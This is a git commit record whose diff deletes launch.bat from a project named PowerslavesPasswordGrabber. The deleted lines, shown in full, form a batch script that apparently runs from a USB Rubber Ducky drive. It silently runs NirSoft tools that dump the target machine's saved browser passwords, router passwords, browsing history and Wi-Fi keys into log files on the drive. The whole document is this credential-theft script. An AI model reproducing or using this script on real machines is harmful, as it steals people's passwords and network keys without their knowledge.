f3896ee31823d031a5a0ee18c1160c8ea752e7a3
powerslaver85 <ram.schenk@gmail.com>
2015-01-24 20:38:38 +0100

    ausgemistet

--- PowerslavesPasswordGrabber/src/launch.bat
+++
@@ -1,6 +0,0 @@
-start %DUCKYdrive%\exec\WebBrowserPassView.exe /stext %DUCKYdrive%\logs\WebBrowserPassLog.txt
-start %DUCKYdrive%\exec\RouterPassView.exe /stext %DUCKYdrive%\logs\RouterPassLog.txt
-start %DUCKYdrive%\exec\BrowsingHistoryView.exe /stext %DUCKYdrive%\logs\BrowsingHistoryLog.txt
-start %DUCKYdrive%\exec\WirelessKeyView.exe /stext %DUCKYdrive%\logs\WirelessKeyLog.txt
-exit
-
